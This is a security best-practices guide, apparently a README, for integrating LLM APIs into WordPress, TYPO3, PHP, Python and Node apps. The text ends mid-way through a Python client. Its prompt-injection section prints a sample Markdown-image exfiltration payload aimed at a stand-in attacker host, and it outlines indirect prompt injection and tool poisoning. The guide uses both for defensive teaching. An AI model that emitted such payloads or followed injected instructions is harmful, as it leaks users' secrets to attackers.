# 🛡️ AI API Security (Best Practices)

**Universal Security Guide for OpenAI, Anthropic Claude, Google Gemini & Other LLM APIs**

[![PHP](https://img.shields.io/badge/PHP-8.3+-777BB4?logo=php)](https://php.net)
[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python)](https://python.org)
[![Node.js](https://img.shields.io/badge/Node.js-22+-339933?logo=node.js)](https://nodejs.org)
[![Security](https://img.shields.io/badge/Security-Critical-red)]()

> **2026 Update**: Refreshed for current model APIs, the OWASP LLM Top 10 (2025) and agentic/MCP setups, with a focus on WordPress & TYPO3 integrations. See the [Changelog](#changelog) for what changed (and who wrote it).

---

## Table of Contents

- [Introduction](#introduction)
  - [Supported Providers](#supported-providers)
- [Critical Security Risks](#critical-security-risks)
  - [Common Mistakes](#common-mistakes)
  - [OWASP Top 10 for LLMs (2025)](#owasp-top-10-for-llms-2025)
  - [Prompt Injection and Output Handling](#prompt-injection-and-output-handling)
  - [Agents, Tools and MCP](#agents-tools-and-mcp)
- [API Key Management](#api-key-management)
  - [Never Do This](#never-do-this)
  - [Correct: Environment Variables](#correct-environment-variables)
  - [Additional Key Security](#additional-key-security)
  - [If a Key Leaks](#if-a-key-leaks)
- [Framework-Specific Guides](#framework-specific-guides)
  - [WordPress Integration](#wordpress-integration)
  - [TYPO3 Extension](#typo3-extension)
- [Code Examples: Multi-Provider Support](#code-examples-multi-provider-support)
  - [Universal PHP API Client](#universal-php-api-client)
  - [Python Async Implementation](#python-async-implementation)
  - [Node.js Implementation](#nodejs-implementation)
- [Security Checklist](#security-checklist)
- [Provider-Specific Documentation](#provider-specific-documentation)
- [Additional Security Resources](#additional-security-resources)
- [Support and Contributions](#support-and-contributions)
- [Changelog](#changelog)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Introduction

While the AI hype continues, we are witnessing catastrophic security failures in LLM API integrations. These best practices cover **all major providers** and are specifically optimized for production environments.

### Supported Providers

- **OpenAI**
- **Anthropic**
- **Google**
- **Meta**
- **Mistral AI**
- **Other OpenAI-compatible APIs**

The same principles apply to cloud-hosted variants (Azure OpenAI, AWS Bedrock, Google Vertex AI) and self-hosted models (Ollama, vLLM).

> **Heads-up:** Model IDs, endpoints and API versions change quickly. All code examples below read model names from environment variables (`OPENAI_MODEL`, `ANTHROPIC_MODEL`, `GEMINI_MODEL`) so this guide doesn't rot. The built-in defaults were current in **October 2026** — check your provider's model list before shipping.

---

## Critical Security Risks

### Common Mistakes

#### 1. API Keys in Client-Side Code

- ❌ Keys embedded in JavaScript/HTML/mobile apps
- ❌ Keys committed to Git repositories
- ❌ Keys visible in Browser Console/Network tab
- ❌ Keys baked into Docker images or printed in CI logs

#### 2. Missing Input Validation

- ❌ Direct pass-through of user input to API
- ❌ No sanitization or filtering
- ❌ No rate limiting, token caps or spend limits (a.k.a. "denial of wallet")

#### 3. Insecure Output Handling

- ❌ LLM output directly inserted into database/code
- ❌ No XSS protection
- ❌ No SQL injection prevention
- ❌ Rendering model-supplied Markdown/HTML with images or external links (data exfiltration channel, see below)

#### 4. Over-Privileged Agents

- ❌ Agents/tools with write, shell or admin access "because it's easier"
- ❌ Unreviewed third-party MCP servers or plugins
- ❌ No human approval for destructive or irreversible actions

### OWASP Top 10 for LLMs (2025)

| ID | Risk | Description | First line of defense |
|----|------|-------------|-----------------------|
| **LLM01** | **Prompt Injection** | Crafted input (direct, or hidden in documents, web pages, emails, tool results) changes model behavior | Treat all model input as untrusted; least privilege; human approval for sensitive actions |
| **LLM02** | **Sensitive Information Disclosure** | PII, secrets or proprietary data leak via outputs, logs or traces | Data minimization; no secrets in prompts/context; filter outputs |
| **LLM03** | **Supply Chain** | Compromised models, datasets, libraries, plugins or hosting providers | Pin and audit dependencies; vet MCP servers, plugins and model sources |
| **LLM04** | **Data and Model Poisoning** | Manipulated training, fine-tuning or RAG data | Vet data sources; track provenance; restrict who can ingest data |
| **LLM05** | **Improper Output Handling** | Unvalidated model output reaches browsers, shells or databases (XSS/SQLi/RCE) | Treat output like user input: encode, validate, parameterize |
| **LLM06** | **Excessive Agency** | Too much functionality, permission or autonomy for tools and agents | Minimal tool set, scoped credentials, human-in-the-loop |
| **LLM07** | **System Prompt Leakage** | Exposure of system prompts and anything secret inside them | Never put secrets in prompts; enforce controls outside the model |
| **LLM08** | **Vector and Embedding Weaknesses** | RAG/embedding store attacks, cross-tenant data leaks | Per-tenant access control on retrieval; validate ingested content |
| **LLM09** | **Misinformation** | Hallucinated or wrong output that people rely on | Ground answers in trusted sources; human review for critical decisions |
| **LLM10** | **Unbounded Consumption** | Resource exhaustion, "denial of wallet", model extraction | Rate limits, token caps, quotas, provider-side spend limits, monitoring |

### Prompt Injection and Output Handling

You can't fully "fix" prompt injection inside the model. Design so that a successful injection can't do much damage:

- **Everything that reaches the model is untrusted**: user input, web pages, emails, PDFs, RAG chunks, tool and MCP results (*indirect* prompt injection).
- **No secrets in system prompts or context.** Assume the system prompt can be extracted.
- **Enforce security in code, not in prompts**: authorization, pricing, "who may see what" must never depend on the model's judgment.
- **Mark untrusted content as such** (clear delimiters, tell the model what it is and where it came from). This helps, but it is not a security boundary.
- **Validate structured output** (JSON schema) before using it. Never `eval()` it, never build SQL or shell commands from it.
- **Escape on output.** Prefer plain text. If you must render formatting, use a strict allow-list (no `<img>`, no external links). Auto-loaded images are a classic exfiltration channel: `![x](https://evil.example/?q=<secret>)`.
- **Cap input size, output tokens and timeouts**, and attribute requests to users (see `safety_identifier` in the OpenAI examples).

### Agents, Tools and MCP

Once a model can call tools, prompt injection turns from "wrong answer" into "wrong action".

- **Least privilege**: separate read-only and write tools; scoped, short-lived credentials per tool; no shared admin tokens.
- **Human approval** for irreversible or sensitive actions (send email, payments, delete, deploy).
- **Avoid the "lethal trifecta"** in a single agent session: access to private data + exposure to untrusted content + a way to communicate externally. Remove at least one.
- **Treat MCP servers and plugins like third-party code**: install only from sources you trust, pin versions, review tool descriptions (tool poisoning), prefer local/sandboxed execution.
- **Sandbox code execution** and set step, time and budget limits for every agent loop.
- **Log tool calls** (who, what, with which arguments) so you can audit and replay incidents.

---
## API Key Management

### Never Do This

```php
// ❌ NEVER DO THIS!
$api_key = "sk-proj-abc123...";
```

```javascript
// ❌ NEVER DO THIS!
const API_KEY = "sk-proj-abc123...";
```

```python
# ❌ NEVER DO THIS!
api_key = "sk-proj-abc123..."
```

### Correct: Environment Variables

> **WordPress/TYPO3 classic:** a `.env` file inside the web root is downloadable (`https://example.com/.env`). Keep it **one level above the document root** and additionally block dotfiles in your web server config (see [Additional Key Security](#additional-key-security)).

#### PHP with `vlucas/phpdotenv`

```bash
composer require vlucas/phpdotenv
```

```env
# .env (DO NOT COMMIT TO GIT! Keep it OUTSIDE the web root!)
OPENAI_API_KEY=sk-proj-xxx
OPENAI_MODEL=gpt-6-luna
ANTHROPIC_API_KEY=sk-ant-xxx
ANTHROPIC_MODEL=claude-sonnet-5-5
GOOGLE_API_KEY=AIzaSyxxx
GEMINI_MODEL=gemini-3.8-flash
```

```php
<?php
// config.php  (the .env lives in the parent directory of the web root)
require_once __DIR__ . '/vendor/autoload.php';

use Dotenv\Dotenv;

$dotenv = Dotenv::createImmutable(dirname(__DIR__));
$dotenv->safeLoad();

$openai_key = $_ENV['OPENAI_API_KEY'] ?? '';
$claude_key = $_ENV['ANTHROPIC_API_KEY'] ?? '';
$gemini_key = $_ENV['GOOGLE_API_KEY'] ?? '';
```

> Note: phpdotenv fills `$_ENV`/`$_SERVER` but **not** `getenv()` by default. In production, prefer real environment variables (php-fpm `env[...]`, systemd, container secrets) and use `.env` for local development only.

---

#### Python with `python-dotenv`

```bash
pip install python-dotenv
```

```env
# .env (DO NOT COMMIT TO GIT!)
OPENAI_API_KEY=sk-proj-xxx
ANTHROPIC_API_KEY=sk-ant-xxx
```

```python
# app.py
import os
from dotenv import load_dotenv

load_dotenv()

openai_key = os.getenv('OPENAI_API_KEY')
claude_key = os.getenv('ANTHROPIC_API_KEY')
```

---

#### Node.js

Node.js 22+ can load `.env` files natively, no extra dependency needed:

```bash
node --env-file=.env app.js
```

```javascript
// app.js
const openaiKey = process.env.OPENAI_API_KEY;
const claudeKey = process.env.ANTHROPIC_API_KEY;
```

Prefer a package? `npm install dotenv` and `require('dotenv').config();` still works.

### Additional Key Security

```gitignore
# .gitignore
.env
.env.*
!.env.example
*.key
secrets/
credentials/
```

**Always create a `.env.example` file:**

```env
# .env.example
OPENAI_API_KEY=your_openai_key_here
OPENAI_MODEL=your_openai_model_id
ANTHROPIC_API_KEY=your_anthropic_key_here
ANTHROPIC_MODEL=your_claude_model_id
GOOGLE_API_KEY=your_google_key_here
GEMINI_MODEL=your_gemini_model_id
```

**Block dotfiles in your web server:**

```nginx
# nginx – never serve .env, .git, ... (but keep .well-known for Let's Encrypt)
location ~ /\.(?!well-known) {
    deny all;
}
```

```apache
# Apache (vhost or .htaccess)
<FilesMatch "^\.env">
    Require all denied
</FilesMatch>
```

**Key hygiene checklist:**

- **One key per app and environment** (dev/staging/prod), scoped to a single project or workspace. A leak then has a small blast radius and usage stays attributable.
- **Set spend and rate limits at the provider**, not only in your own code.
- **Prefer short-lived credentials over static keys**: Workload Identity Federation (offered by [Anthropic](https://platform.claude.com/docs/en/manage-claude/authentication) and [OpenAI](https://developers.openai.com/api/docs/guides/workload-identity-federation)) or cloud IAM (Bedrock, Vertex AI, Azure) wherever your platform supports it.
- **If you must use static keys:** set an expiry where the provider allows it, store them in a secrets manager, rotate regularly. For shared or production workloads Anthropic recommends service-account keys over personal keys.
- **Server-side only**: browsers and mobile apps talk to *your* backend, which holds the key.
- **No keys in URLs**: query strings end up in access logs, proxies and error messages. Use header-based auth (e.g. `x-goog-api-key` for Gemini instead of `?key=`).
- **Never log keys or full request headers.**
- **Turn on secret scanning and push protection** (GitHub/GitLab) and add a pre-commit hook such as [Gitleaks](https://github.com/gitleaks/gitleaks).

### If a Key Leaks

1. **Revoke/disable the key at the provider immediately.** Before anything else.
2. **Check usage dashboards and logs** for abuse; lower spend limits while you investigate.
3. **Create a new key** (scoped, with expiry if possible) and deploy it.
4. **Remove the secret from code and Git history** (`git filter-repo`, BFG), but only *after* rotating. Rewriting history does not un-leak anything; forks, clones and caches may already have it.
5. **Find the root cause** (client bundle, CI logs, error pages, backups, `.env` in the web root) and add scanning so it can't happen silently again.

---
## Framework-Specific Guides

Both examples call OpenAI's Responses API. For other providers, swap the request/response handling with the clients from [Code Examples](#code-examples-multi-provider-support). The security pattern stays the same: **authorize → validate → rate-limit → call the API server-side → escape the output.**

### WordPress Integration

```php
<?php
/**
 * Plugin Name: Secure AI Integration
 * Description: Secure AI API Integration for WordPress
 * Version: 1.1.0
 * Author: Your Name
 * Text Domain: secure-ai
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

/**
 * API key: define it in wp-config.php (one level above the web root if possible)
 * or provide it as a real server environment variable.
 * NEVER store it in the plugin, the theme or the database (wp_options).
 *
 *   // wp-config.php
 *   define('SECURE_AI_API_KEY', getenv('OPENAI_API_KEY'));
 */
function secure_ai_api_key(): string {
    if (defined('SECURE_AI_API_KEY') && SECURE_AI_API_KEY) {
        return (string) SECURE_AI_API_KEY;
    }
    return (string) getenv('OPENAI_API_KEY');
}

function secure_ai_model(): string {
    return getenv('OPENAI_MODEL') ?: 'gpt-6-luna';
}

/**
 * Handle AJAX request for AI generation.
 * Logged-in users only. Do NOT add wp_ajax_nopriv_* unless you add
 * CAPTCHA/login plus much stricter limits: anonymous endpoints burn your budget.
 */
add_action('wp_ajax_secure_ai_request', 'secure_ai_handle_request');

function secure_ai_handle_request(): void {
    // CSRF protection
    check_ajax_referer('secure_ai_nonce', 'nonce');

    // Authorization
    if (!current_user_can('edit_posts')) {
        wp_send_json_error(['message' => 'Insufficient permissions']);
    }

    // Input validation + sanitization
    $prompt = isset($_POST['prompt']) ? sanitize_textarea_field(wp_unslash($_POST['prompt'])) : '';
    if ($prompt === '' || mb_strlen($prompt) > 4000) {
        wp_send_json_error(['message' => 'Prompt is empty or too long']);
    }

    // Rate limiting via transients (1 request per minute per user)
    $user_id  = get_current_user_id();
    $rate_key = 'secure_ai_rate_' . $user_id;

    if (get_transient($rate_key)) {
        wp_send_json_error(['message' => 'Rate limit exceeded. Please wait.']);
    }
    set_transient($rate_key, 1, 60);

    $api_key = secure_ai_api_key();
    if ($api_key === '') {
        error_log('Secure AI: API key not configured');
        wp_send_json_error(['message' => 'Service not configured']);
    }

    // Make API call (OpenAI Responses API)
    $response = wp_remote_post('https://api.openai.com/v1/responses', [
        'timeout' => 30,
        'headers' => [
            'Authorization' => 'Bearer ' . $api_key,
            'Content-Type'  => 'application/json',
        ],
        'body' => wp_json_encode([
            'model'             => secure_ai_model(),
            'instructions'      => 'You are a helpful assistant.',
            'input'             => $prompt,
            // Reasoning models spend part of this budget on hidden reasoning tokens
            'max_output_tokens' => 2000,
            // Don't keep prompts/responses stored at the provider
            'store'             => false,
            // Stable, privacy-preserving per-user ID (hash it; never send emails/usernames)
            'safety_identifier' => hash('sha256', wp_salt() . '|' . $user_id),
        ]),
    ]);

    // Error handling (log details server-side, return generic messages)
    if (is_wp_error($response)) {
        error_log('Secure AI request failed: ' . $response->get_error_message());
        wp_send_json_error(['message' => 'API request failed']);
    }

    $http_code = wp_remote_retrieve_response_code($response);
    if ($http_code !== 200) {
        error_log('Secure AI HTTP error: ' . $http_code);
        wp_send_json_error(['message' => 'API returned an error']);
    }

    $data = json_decode(wp_remote_retrieve_body($response), true);

    // Responses API: collect all output_text blocks of "message" items
    $text = '';
    foreach (($data['output'] ?? []) as $item) {
        if (($item['type'] ?? '') !== 'message') {
            continue;
        }
        foreach (($item['content'] ?? []) as $block) {
            if (($block['type'] ?? '') === 'output_text') {
                $text .= $block['text'] ?? '';
            }
        }
    }

    // Output sanitization with a STRICT allow-list: no <img>, no <a>, no attributes.
    // (wp_kses_post() allows images/links, which can be abused to exfiltrate data
    // via prompt injection.)
    $allowed = [
        'p' => [], 'br' => [], 'strong' => [], 'em' => [],
        'ul' => [], 'ol' => [], 'li' => [], 'code' => [], 'pre' => [],
    ];

    wp_send_json_success(['response' => wp_kses($text, $allowed)]);
}

/**
 * Enqueue scripts with nonce (only for users who may use the feature)
 */
add_action('wp_enqueue_scripts', 'secure_ai_enqueue_scripts');

function secure_ai_enqueue_scripts(): void {
    if (!is_user_logged_in() || !current_user_can('edit_posts')) {
        return;
    }

    wp_enqueue_script('secure-ai-handler', plugins_url('js/ai-handler.js', __FILE__), ['jquery'], '1.1.0', true);

    wp_localize_script('secure-ai-handler', 'aiConfig', [
        'ajaxUrl' => admin_url('admin-ajax.php'),
        'nonce'   => wp_create_nonce('secure_ai_nonce'),
    ]);
}
```

**Frontend JavaScript (js/ai-handler.js):**

```javascript
jQuery(document).ready(function ($) {
    $('#ai-submit').on('click', function (e) {
        e.preventDefault();

        const prompt  = $('#ai-prompt').val();
        const $button = $(this);
        const $result = $('#ai-result');

        $button.prop('disabled', true).text('Generating...');

        $.ajax({
            url: aiConfig.ajaxUrl,
            type: 'POST',
            data: {
                action: 'secure_ai_request',
                nonce: aiConfig.nonce,
                prompt: prompt
            },
            success: function (response) {
                if (response.success) {
                    // Already sanitized server-side with a strict allow-list
                    $result.html(response.data.response);
                } else {
                    // .text(): never inject messages as HTML
                    $result.empty().append($('<p class="error">').text(response.data.message));
                }
            },
            error: function () {
                $result.empty().append($('<p class="error">').text('Request failed. Please try again.'));
            },
            complete: function () {
                $button.prop('disabled', false).text('Generate');
            }
        });
    });
});
```

---

### TYPO3 Extension

> Written for TYPO3 12+ (constructor injection, PSR-3 logger, Core `RequestFactory`). Replace `Vendor\Extension`, `YourExtension` and `your_extension` with your own names. The classes are autowired by the standard `Configuration/Services.yaml` of your extension. After adding the cache configuration below, run the database schema update once (Admin Tools → Maintenance → Analyze Database Structure, or `typo3 database:updateschema`) so the cache tables exist.

**1. Register the plugin and a persistent cache for rate limiting**

```php
<?php
// Configuration/TCA/Overrides/tt_content.php
defined('TYPO3') or die();

\TYPO3\CMS\Extbase\Utility\ExtensionUtility::registerPlugin(
    'YourExtension',
    'AiGenerator',
    'LLL:EXT:your_extension/Resources/Private/Language/locallang.xlf:ai_generator'
);
```

```php
<?php
// ext_localconf.php
declare(strict_types=1);

use TYPO3\CMS\Core\Cache\Backend\Typo3DatabaseBackend;
use TYPO3\CMS\Core\Cache\Frontend\VariableFrontend;
use TYPO3\CMS\Extbase\Utility\ExtensionUtility;
use Vendor\Extension\Controller\AIController;

defined('TYPO3') or die();

// Persistent cache for rate limiting.
// Do NOT use the built-in "runtime" cache: it only lives for ONE request,
// so it can never rate-limit anything across requests.
$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations']['your_extension_ratelimit'] ??= [
    'frontend' => VariableFrontend::class,
    'backend'  => Typo3DatabaseBackend::class,
    'options'  => ['defaultLifetime' => 60],
    'groups'   => ['system'],
];

ExtensionUtility::configurePlugin(
    'YourExtension',
    'AiGenerator',
    [AIController::class => 'generate'],
    // not cacheable: user-specific and costs money
    [AIController::class => 'generate'],
);
```

**2. Service**

```php
<?php
// Classes/Service/AIService.php
declare(strict_types=1);

namespace Vendor\Extension\Service;

use GuzzleHttp\Exception\GuzzleException;
use Psr\Log\LoggerInterface;
use TYPO3\CMS\Core\Cache\CacheManager;
use TYPO3\CMS\Core\Http\RequestFactory;

class AIService
{
    private const API_URL = 'https://api.openai.com/v1/responses';
    private const MAX_PROMPT_LENGTH = 4000;

    public function __construct(
        private readonly RequestFactory $requestFactory,
        private readonly CacheManager $cacheManager,
        private readonly LoggerInterface $logger,
    ) {
    }

    /**
     * Generate content using the OpenAI Responses API
     *
     * @param string $prompt     User prompt
     * @param string $identifier Stable ID for rate limiting/attribution (FE user ID or IP)
     * @return string Raw generated text (escape on output!)
     * @throws \InvalidArgumentException user-safe message
     * @throws \RuntimeException         user-safe message
     */
    public function generateContent(string $prompt, string $identifier): string
    {
        // Input validation
        $prompt = trim($prompt);
        if ($prompt === '' || mb_strlen($prompt) > self::MAX_PROMPT_LENGTH) {
            throw new \InvalidArgumentException('Prompt is empty or too long');
        }

        $apiKey = $this->resolveApiKey();
        if ($apiKey === '') {
            $this->logger->error('OpenAI API key not configured');
            throw new \RuntimeException('AI service is not configured');
        }

        // Rate limiting: 1 request per minute per identifier (persistent cache!)
        $cache    = $this->cacheManager->getCache('your_extension_ratelimit');
        $cacheKey = 'rl_' . sha1($identifier);
        if ($cache->has($cacheKey)) {
            throw new \RuntimeException('Rate limit exceeded. Please wait before making another request.');
        }
        $cache->set($cacheKey, true, [], 60);

        try {
            $response = $this->requestFactory->request(self::API_URL, 'POST', [
                'headers' => ['Authorization' => 'Bearer ' . $apiKey],
                'timeout' => 30,
                'json'    => [
                    'model'             => getenv('OPENAI_MODEL') ?: 'gpt-6-luna',
                    'instructions'      => 'Generate SEO-optimized, professional content.',
                    'input'             => $prompt,
                    'max_output_tokens' => 2000,
                    'store'             => false,
                    'safety_identifier' => hash('sha256', $identifier),
                ],
            ]);

            $data = json_decode((string)$response->getBody(), true, 512, JSON_THROW_ON_ERROR);
        } catch (GuzzleException | \JsonException $e) {
            // Log the message only (never request headers); show nothing internal to the user
            $this->logger->error('AI API request failed: ' . $e->getMessage());
            throw new \RuntimeException('AI service temporarily unavailable');
        }

        // Responses API: collect all output_text blocks of "message" items
        $text = '';
        foreach ($data['output'] ?? [] as $item) {
            if (($item['type'] ?? '') !== 'message') {
                continue;
            }
            foreach ($item['content'] ?? [] as $block) {
                if (($block['type'] ?? '') === 'output_text') {
                    $text .= $block['text'] ?? '';
                }
            }
        }

        if ($text === '') {
            throw new \RuntimeException('Invalid API response');
        }

        // Return RAW text. Fluid escapes on output. Do NOT htmlspecialchars() here
        // (double escaping) and NEVER render it with f:format.raw.
        return $text;
    }

    private function resolveApiKey(): string
    {
        $key = getenv('OPENAI_API_KEY');
        if (is_string($key) && $key !== '') {
            return $key;
        }

        // Fallback: extension configuration (stored in settings.php, keep that out of Git!)
        return (string)($GLOBALS['TYPO3_CONF_VARS']['EXTENSIONS']['your_extension']['openaiApiKey'] ?? '');
    }
}
```

**3. Controller**

```php
<?php
// Classes/Controller/AIController.php
declare(strict_types=1);

namespace Vendor\Extension\Controller;

use Psr\Http\Message\ResponseInterface;
use TYPO3\CMS\Core\Context\Context;
use TYPO3\CMS\Extbase\Mvc\Controller\ActionController;
use Vendor\Extension\Service\AIService;

class AIController extends ActionController
{
    public function __construct(
        private readonly AIService $aiService,
        private readonly Context $context,
    ) {
    }

    public function generateAction(string $prompt = ''): ResponseInterface
    {
        // Only POST may trigger (and pay for) an API call
        if ($this->request->getMethod() !== 'POST') {
            return $this->htmlResponse();
        }

        try {
            $content = $this->aiService->generateContent($prompt, $this->rateLimitIdentifier());
            $this->view->assign('content', $content);
        } catch (\InvalidArgumentException | \RuntimeException $e) {
            // AIService only throws user-safe messages
            $this->view->assign('error', $e->getMessage());
        }

        return $this->htmlResponse();
    }

    /**
     * Logged-in frontend users are limited per user, everyone else per IP.
     * (One shared bucket for all anonymous visitors would lock everybody out.)
     * Behind a reverse proxy configure TYPO3's reverseProxy* settings,
     * otherwise all visitors share the proxy's IP. For anonymous use,
     * consider requiring a login or a CAPTCHA instead.
     */
    private function rateLimitIdentifier(): string
    {
        $userId = (int)$this->context->getPropertyFromAspect('frontend.user', 'id', 0);
        if ($userId > 0) {
            return 'fe_' . $userId;
        }

        return 'ip_' . $this->request->getAttribute('normalizedParams')->getRemoteAddress();
    }
}
```

**4. Fluid template** (`Resources/Private/Templates/AI/Generate.html`)

```html
<f:form action="generate" method="post">
    <f:form.textarea name="prompt" maxlength="4000" />
    <f:form.submit value="Generate" />
</f:form>

<f:if condition="{error}"><p class="error">{error}</p></f:if>

<f:if condition="{content}">
    <!-- {content} is escaped by Fluid. Never use f:format.raw on LLM output. -->
    <div class="ai-output">{content}</div>
</f:if>
```

```css
.ai-output { white-space: pre-wrap; } /* keep line breaks without unescaped HTML */
```

---
## Code Examples: Multi-Provider Support

All three clients follow the same rules:

- keys and model IDs come from **environment variables** (keys are read lazily, so you only need keys for the providers you actually use)
- **no keys in URLs** (Gemini gets `x-goog-api-key` as a header instead of `?key=`)
- **timeouts**, **no redirects with credentials**, and **error messages that don't leak response bodies**
- **no sampling parameters** (`temperature`, `top_p`, `top_k`): many current models reject them (OpenAI reasoning models), and Anthropic's newest API version removed them entirely
- OpenAI via the **Responses API** (recommended for new projects; Chat Completions remains supported), with `store: false` so prompts aren't kept at the provider

> Reasoning/thinking models spend part of `max_tokens` on hidden reasoning tokens. Keep the cap generous (the examples use 2000), otherwise you may get truncated or empty answers.

### Universal PHP API Client

```php
<?php
declare(strict_types=1);

/**
 * Universal AI API Client
 * Supports multiple LLM providers with a consistent interface.
 *
 * Environment variables (only for the providers you use):
 *   OPENAI_API_KEY    [OPENAI_MODEL]
 *   ANTHROPIC_API_KEY [ANTHROPIC_MODEL]
 *   GOOGLE_API_KEY    [GEMINI_MODEL]
 */
final class UniversalAIClient
{
    private const TIMEOUT = 30;

    // https://platform.claude.com/docs/en/api/versioning
    private const ANTHROPIC_VERSION = '2026-10-21';

    /**
     * Send a prompt to the specified provider.
     *
     * @param string $provider openai | claude | gemini
     * @param string $prompt   User prompt
     * @param array  $options  model, max_tokens
     * @return string AI response text
     * @throws \InvalidArgumentException
     * @throws \RuntimeException
     */
    public function chat(string $provider, string $prompt, array $options = []): string
    {
        $maxTokens = (int) ($options['max_tokens'] ?? 2000);

        // match evaluates only the selected arm, so only that provider's key is required
        [$url, $headers, $payload] = match ($provider) {
            'openai' => [
                'https://api.openai.com/v1/responses',
                ['Authorization: Bearer ' . $this->key('OPENAI_API_KEY')],
                [
                    'model'             => $options['model'] ?? ($this->env('OPENAI_MODEL') ?: 'gpt-6-luna'),
                    'input'             => $prompt,
                    'max_output_tokens' => $maxTokens,
                    'store'             => false, // don't keep prompts/responses at the provider
                ],
            ],
            'claude' => [
                'https://api.anthropic.com/v1/messages',
                [
                    'Authorization: Bearer ' . $this->key('ANTHROPIC_API_KEY'),
                    'anthropic-version: ' . self::ANTHROPIC_VERSION,
                ],
                [
                    'model'      => $options['model'] ?? ($this->env('ANTHROPIC_MODEL') ?: 'claude-sonnet-5-5'),
                    'max_tokens' => $maxTokens,
                    'messages'   => [['role' => 'user', 'content' => $prompt]],
                ],
            ],
            'gemini' => [
                'https://generativelanguage.googleapis.com/v1beta/models/'
                    . rawurlencode($options['model'] ?? ($this->env('GEMINI_MODEL') ?: 'gemini-3.8-flash'))
                    . ':generateContent',
                // The key goes into a header, never into the URL (URLs end up in logs)
                ['x-goog-api-key: ' . $this->key('GOOGLE_API_KEY')],
                [
                    'contents'         => [['parts' => [['text' => $prompt]]]],
                    'generationConfig' => ['maxOutputTokens' => $maxTokens],
                ],
            ],
            default => throw new \InvalidArgumentException("Unknown provider: $provider"),
        };

        $data = $this->post($provider, $url, $headers, $payload);

        $text = match ($provider) {
            'openai' => $this->extractOpenAIText($data),
            'claude' => implode('', array_column(
                array_filter($data['content'] ?? [], static fn ($b) => ($b['type'] ?? '') === 'text'),
                'text'
            )),
            'gemini' => implode('', array_column($data['candidates'][0]['content']['parts'] ?? [], 'text')),
        };

        if ($text === '') {
            throw new \RuntimeException("Invalid $provider response format");
        }

        return $text;
    }

    /**
     * Responses API: collect all output_text blocks of "message" items
     */
    private function extractOpenAIText(array $data): string
    {
        $text = '';
        foreach ($data['output'] ?? [] as $item) {
            if (($item['type'] ?? '') !== 'message') {
                continue;
            }
            foreach ($item['content'] ?? [] as $block) {
                if (($block['type'] ?? '') === 'output_text') {
                    $text .= $block['text'] ?? '';
                }
            }
        }

        return $text;
    }

    /**
     * POST JSON and return the decoded response
     */
    private function post(string $provider, string $url, array $headers, array $payload): array
    {
        $ch = curl_init($url);

        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT        => self::TIMEOUT,
            CURLOPT_FOLLOWLOCATION => false, // never follow redirects with credentials attached
            CURLOPT_HTTPHEADER     => [...$headers, 'Content-Type: application/json'],
            CURLOPT_POSTFIELDS     => json_encode($payload, JSON_THROW_ON_ERROR),
        ]);

        $body     = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
        $error    = curl_error($ch);
        // No curl_close() needed: handles are objects since PHP 8.0 and freed automatically.

        if ($body === false) {
            throw new \RuntimeException("$provider request failed: $error");
        }

        if ($httpCode !== 200) {
            // Status only: response bodies can contain details you don't want in logs.
            throw new \RuntimeException("$provider API error: HTTP $httpCode");
        }

        $data = json_decode($body, true, 512, JSON_THROW_ON_ERROR);

        if (!is_array($data)) {
            throw new \RuntimeException("Invalid $provider response format");
        }

        return $data;
    }

    /**
     * Read an API key from the environment
     */
    private function key(string $envName): string
    {
        $key = $this->env($envName);

        if ($key === '') {
            throw new \RuntimeException("Missing API key: set $envName");
        }

        return $key;
    }

    /**
     * Read a setting from real environment variables or from phpdotenv
     * (phpdotenv fills $_ENV/$_SERVER, but not getenv(), by default)
     */
    private function env(string $name): string
    {
        $value = $_ENV[$name] ?? $_SERVER[$name] ?? getenv($name);

        return is_string($value) ? $value : '';
    }
}

// Usage example
try {
    $client = new UniversalAIClient();

    // OpenAI request
    echo 'OpenAI: ' . $client->chat('openai', 'Explain quantum computing in simple terms') . "\n\n";

    // Claude request
    echo 'Claude: ' . $client->chat('claude', 'Write a haiku about security', ['max_tokens' => 300]) . "\n\n";

    // Gemini request
    echo 'Gemini: ' . $client->chat('gemini', 'What are best practices for API security?') . "\n";
} catch (\Throwable $e) {
    error_log('AI Client Error: ' . $e->getMessage());
    echo 'An error occurred. Please try again later.';
}
```

---

### Python Async Implementation

```python
"""
Universal AI API Client - Async Implementation
Supports OpenAI, Anthropic Claude and Google Gemini.

Environment variables (only for the providers you use):
  OPENAI_API_KEY    [OPENAI_MODEL]
  ANTHROPIC_API_KEY [ANTHROPIC_MODEL]
  GOOGLE_API_KEY    [GEMINI_MODEL]

Requires: pip install aiohttp
"""
import asyncio
import os
from typing import Any
from urllib.parse import quote

import aiohttp

TIMEOUT = aiohttp.ClientTimeout(total=30)
ANTHROPIC_VERSION = "2026-10-21"  # https://platform.claude.com/docs/en/api/versioning


class UniversalAIClient:
    """Universal async client for multiple AI providers"""

    @staticmethod
    def _key(env_name: str) -> str:
        """Read an API key lazily, so only the providers you use need a key"""
        key = os.getenv(env_name, "")
        if not key:
            raise ValueError(f"Missing API key: set {env_name}")
        return key

    def _build_request(
        self, provider: str, prompt: str, model: str | None, max_tokens: int
    ) -> tuple[str, dict[str, str], dict[str, Any]]:
        """Return (url, headers, payload) for a provider"""
        if provider == "openai":
            return (
                "https://api.openai.com/v1/responses",
                {"Authorization": f"Bearer {self._key('OPENAI_API_KEY')}"},
                {
                    "model": model or os.getenv("OPENAI_MODEL") or "gpt-6-luna",
                    "input": prompt,
                    "max_output_tokens": max_tokens,
                    "store": False,  # don't keep prompts/responses at the provider
                },
            )

        if provider == "claude":
            return (
                "https://api.anthropic.com/v1/messages",
                {
                    "Authorization": f"Bearer {self._key('ANTHROPIC_API_KEY')}",
                    "anthropic-version": ANTHROPIC_VERSION,
                },
                {
                    "model": model or os.getenv("ANTHROPIC_MODEL") or "claude-sonnet-5-5",
                    "max_tokens": max_tokens,
                    "messages": [{"role": "user", "content": prompt}],
                },
            )

        if provider == "gemini":
            gemini_model = quote(model or os.getenv("GEMINI_MODEL") or "gemini-3.8-flash", safe="")
            return (
                f"https://generativelanguage.googleapis.com/v1beta/models/{gemini_model}:generateContent",
